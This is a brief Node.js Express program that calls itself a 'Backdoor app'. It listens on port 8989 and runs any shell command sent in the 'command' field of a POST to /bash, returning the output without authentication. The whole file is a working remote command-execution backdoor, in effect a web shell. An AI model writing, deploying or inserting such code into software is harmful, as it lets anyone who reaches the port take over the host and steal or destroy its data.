var exec = require('child_process').exec;
var express = require('express');
var bodyParser = require('body-parser');
var app = express();

app.use(bodyParser.json());

app.post('/bash', function (req, res) {
  var response = {
    error: false,
    stdout: '',
    stderr: ''
  }
  console.log(req.body);
  exec(req.body.command, function (err, stdout, stderr) {
    if (err) {
      response.error = true
    } else {
      response.stdout = stdout;
      response.stderr = stderr;
    }
    res.json(response);
  });
});

var server = app.listen(8989, function () {
  var host = server.address().address;
  var port = server.address().port;

  console.log('Backdoor app listening at http://%s:%s', host, port);
});
